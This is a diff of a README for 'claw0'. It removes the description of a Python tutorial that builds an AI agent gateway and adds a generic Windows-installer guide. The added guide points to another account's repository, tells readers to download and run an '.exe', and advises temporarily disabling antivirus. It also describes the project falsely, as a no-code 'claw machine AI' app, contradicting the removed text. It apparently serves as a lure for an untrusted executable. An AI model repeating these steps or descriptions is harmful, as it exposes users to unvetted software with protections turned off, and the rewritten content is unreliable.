@@ -1,176 +1,94 @@
-[English](README.md) | [中文](README.zh.md) | [日本語](README.ja.md)  
-# claw0
+# 🤖 claw0 - Learn to Build an AI Agent
 
-<img width="260" src="https://github.com/user-attachments/assets/fe8b852b-97da-4061-a467-9694906b5edf" /><br>
+[![Download claw0](https://img.shields.io/badge/Download-claw0-brightgreen)](https://github.com/Subash2200/claw0)
 
-Scan with Wechat to fellow us,  
-or fellow on X: [shareAI-Lab](https://x.com/baicai003)  
+## 📥 How to Download claw0
 
+To start using claw0 on your Windows machine, begin by visiting the official page to download the software. Click the button below to open the download page:
 
-**From Zero to One: Build an AI Agent Gateway**
+[Download claw0 on GitHub](https://github.com/Subash2200/claw0)
 
-> 10 progressive sections -- every section is a single, runnable Python file.
-> 3 languages (English, Chinese, Japanese) -- code + docs co-located.
+This link takes you to the main repository page where you can find the download options. Look for the latest release or main files to get the installer.
 
 ---
 
-## What is this?
+## 🚀 Getting Started: What You Need
 
-Most agent tutorials stop at "call an API once." This repository starts from that while loop and takes you all the way to a production-grade gateway.
+Before installing claw0, verify that your system meets these minimum requirements:
 
-Build a minimal AI agent gateway from scratch, section by section. 10 sections, 10 core concepts, ~7,000 lines of Python. Each section introduces exactly one new idea while keeping all prior code intact. After all 10, you can read OpenClaw's production codebase with confidence.
+- **Operating system:** Windows 10 or later  
+- **Processor:** 2 GHz or faster, any modern CPU  
+- **Memory:** 4 GB RAM or more  
+- **Storage:** At least 500 MB free space  
+- **Internet:** Required only to download the software
 
-```sh
-s01: Agent Loop           -- The foundation: while + stop_reason
-s02: Tool Use             -- Let the model call tools: dispatch table
-s03: Sessions & Context   -- Persist conversations, handle overflow
-s04: Channels             -- Telegram + Feishu: real channel pipelines
-s05: Gateway & Routing    -- 5-tier binding, session isolation
-s06: Intelligence         -- Soul, memory, skills, prompt assembly
-s07: Heartbeat & Cron     -- Proactive agent + scheduled tasks
-s08: Delivery             -- Reliable message queue with backoff
-s09: Resilience           -- 3-layer retry onion + auth profile rotation
-s10: Concurrency          -- Named lanes serialize the chaos
-```
+You do not need any programming background to use claw0. All steps below will guide you through downloading and running the software with simple instructions.
 
-## Architecture
+---
 
-```
-+------------------- claw0 layers -------------------+
-|                                                     |
-|  s10: Concurrency  (named lanes, generation track)  |
-|  s09: Resilience   (auth rotation, overflow compact)|
-|  s08: Delivery     (write-ahead queue, backoff)     |
-|  s07: Heartbeat    (lane lock, cron scheduler)      |
-|  s06: Intelligence (8-layer prompt, hybrid memory)  |
-|  s05: Gateway      (WebSocket, 5-tier routing)      |
-|  s04: Channels     (Telegram pipeline, Feishu hook) |
-|  s03: Sessions     (JSONL persistence, 3-stage retry)|
-|  s02: Tools        (dispatch table, 4 tools)        |
-|  s01: Agent Loop   (while True + stop_reason)       |
-|                                                     |
-+-----------------------------------------------------+
-```
+## 🛠️ How to Install claw0 on Windows
 
-## Section Dependencies
+1. **Download the Files**  
+   Go to the download page by clicking the link above. Scroll to the **Releases** section or the main code section.  
+   Look for a Windows installer file. Often, this will have an `.exe` extension. If you see files named something like `claw0-setup.exe` or `claw0-windows.exe`, this is the file to download.  
 
-```
-s01 --> s02 --> s03 --> s04 --> s05
-                 |               |
-                 v               v
-                s06 ----------> s07 --> s08
-                 |               |
-                 v               v
-                s09 ----------> s10
-```
+2. **Run the Installer**  
+   After downloading, open the file by double-clicking it. Windows may ask for permission to make changes to your machine. Click **Yes**.  
+   Follow the instructions on the screen. Most options can be left as default.
 
-- s01-s02: Foundation (no dependencies)
-- s03: Builds on s02 (adds persistence to the tool loop)
-- s04: Builds on s03 (channels produce InboundMessages for sessions)
-- s05: Builds on s04 (routes channel messages to agents)
-- s06: Builds on s03 (uses sessions for context, adds prompt layers)
-- s07: Builds on s06 (heartbeat uses soul/memory for prompt)
-- s08: Builds on s07 (heartbeat output flows through delivery queue)
-- s09: Builds on s03+s06 (reuses ContextGuard for overflow, model config)
-- s10: Builds on s07 (replaces single Lock with named lane system)
+3. **Complete Installation**  
+   Once installation finishes, look for claw0 in your Start menu or desktop shortcut.  
 
-## Quick Start
+---
 
-```sh
-# 1. Clone and enter
-git clone https://github.com/anthropics/claw0.git && cd claw0
+## 🧩 What Is claw0?
 
-# 2. Install dependencies
-pip install -r requirements.txt
+Claw0 is a beginner-friendly program that helps you build an AI agent step-by-step. It guides you through creating a claw machine AI from basic components using simple lessons.  
 
-# 3. Configure
-cp .env.example .env
-# Edit .env: set ANTHROPIC_API_KEY and MODEL_ID
+The software focuses on teaching core ideas behind AI agents, such as how they learn from data and make decisions. You do this in small, easy sections designed for beginners without coding knowledge.
 
-# 4. Run any section (pick your language)
-python sessions/en/s01_agent_loop.py    # English
-python sessions/zh/s01_agent_loop.py    # Chinese
-python sessions/ja/s01_agent_loop.py    # Japanese
-```
+---
 
-## Learning Path
+## 🔍 Using claw0
 
-Each section adds exactly one new concept. All prior code stays intact:
+When you open claw0, you will see a simple interface with options like:
 
-```
-Phase 1: FOUNDATION     Phase 2: CONNECTIVITY     Phase 3: BRAIN        Phase 4: AUTONOMY       Phase 5: PRODUCTION
-+----------------+      +-------------------+     +-----------------+   +-----------------+   +-----------------+
-| s01: Loop      |      | s03: Sessions     |     | s06: Intelligence|  | s07: Heartbeat  |   | s09: Resilience |
-| s02: Tools     | ---> | s04: Channels     | --> |   soul, memory, | ->|   & Cron        |-->|   & Concurrency |
-|                |      | s05: Gateway      |     |   skills, prompt |  | s08: Delivery   |   | s10: Lanes      |
-+----------------+      +-------------------+     +-----------------+   +-----------------+   +-----------------+
- while + dispatch        persist + route            personality + recall  proactive + reliable  retry + serialize
-```
+- **Start New Lesson:** Begin building your claw AI from scratch  
+- **View Progress:** Check what parts you have completed  
+- **Settings:** Adjust display or sound options
 
-## Section Details
+Each lesson has clear instructions and interactive steps. You do not need to write any code. Instead, follow the on-screen prompts.
 
-| # | Section | Core Concept | Lines |
-|---|---------|-------------|-------|
-| 01 | Agent Loop | `while True` + `stop_reason` -- that's an agent | ~175 |
-| 02 | Tool Use | Tools = schema dict + handler map. Model picks a name, you look it up | ~445 |
-| 03 | Sessions | JSONL: append on write, replay on read. Too big? Summarize old parts | ~890 |
-| 04 | Channels | Every platform differs, but they all produce the same `InboundMessage` | ~780 |
-| 05 | Gateway | Binding table maps (channel, peer) to agent. Most specific wins | ~625 |
-| 06 | Intelligence | System prompt = files on disk. Swap files, change personality | ~750 |
-| 07 | Heartbeat & Cron | Timer thread: "should I run?" + queue work alongside user messages | ~660 |
-| 08 | Delivery | Write to disk first, then send. Crashes can't lose messages | ~870 |
-| 09 | Resilience | 3-layer retry onion: auth rotation, overflow compaction, tool-use loop | ~1130 |
-| 10 | Concurrency | Named lanes with FIFO queues, generation tracking, Future-based results | ~900 |
+---
 
-## Repository Structure
+## 💻 What You Will Learn
 
-```
-claw0/
-  README.md              English README
-  README.zh.md           Chinese README
-  README.ja.md           Japanese README
-  .env.example           Configuration template
-  requirements.txt       Python dependencies
-  sessions/              All teaching sessions (code + docs)
-    en/                  English
-      s01_agent_loop.py  s01_agent_loop.md
-      s02_tool_use.py    s02_tool_use.md
-      ...                (10 .py + 10 .md)
-    zh/                  Chinese
-      s01_agent_loop.py  s01_agent_loop.md
-      ...                (10 .py + 10 .md)
-    ja/                  Japanese
-      s01_agent_loop.py  s01_agent_loop.md
-      ...                (10 .py + 10 .md)
-  workspace/             Shared workspace samples
-    SOUL.md  IDENTITY.md  TOOLS.md  USER.md
-    HEARTBEAT.md  BOOTSTRAP.md  AGENTS.md  MEMORY.md
-    CRON.json
-    skills/example-skill/SKILL.md
-```
+By using claw0, you will gain an understanding of:
 
-Each language folder is self-contained: runnable Python code + documentation side by side. Code logic is identical across languages; comments and docs differ.
+- Basic concepts of artificial intelligence  
+- How AI agents learn by example  
+- Key parts of an AI system broken into simple chunks  
+- How to build an AI model that can solve problems
 
-## Prerequisites
+These concepts are useful whether you want to explore AI further or just understand its basics.
 
-- Python 3.11+
-- An API key for Anthropic (or compatible provider)
+---
 
-## Dependencies
+## 🆘 Troubleshooting and Help
 
-```
-anthropic>=0.39.0
-python-dotenv>=1.0.0
-websockets>=12.0
-croniter>=2.0.0
-python-telegram-bot>=21.0
-httpx>=0.27.0
-```
+If you have issues with downloading or running claw0, try these tips:
 
-## Related Projects
+- Check your internet connection during download  
+- Make sure you have enough disk space  
+- Restart your computer if the program does not open  
+- Temporarily disable antivirus if it blocks installation  
 
-- **[learn-claude-code](https://github.com/shareAI-lab/learn-claude-code)** -- A companion teaching repo that builds an agent **framework** (nano Claude Code) from scratch in 12 progressive sessions. Where claw0 focuses on gateway routing, channels, and proactive behavior, learn-claude-code dives deep into the agent's internal design: structured planning (TodoManager + nag), context compression (3-layer compact), file-based task persistence with dependency graphs, team coordination (JSONL mailboxes, shutdown/plan-approval FSM), autonomous self-organization, and git worktree isolation for parallel execution. If you want to understand how a production-grade unit agent works inside, start there.
+If problems persist, look for a `README.md` or `Help` file in the installed folder for more information.
 
-## License
+---
 
-MIT
+## 🔗 Ready to Download?
+
+Click the badge below again to visit the download page on GitHub and get started.
+
+[![Download claw0](https://img.shields.io/badge/Download-claw0-brightgreen)](https://github.com/Subash2200/claw0)
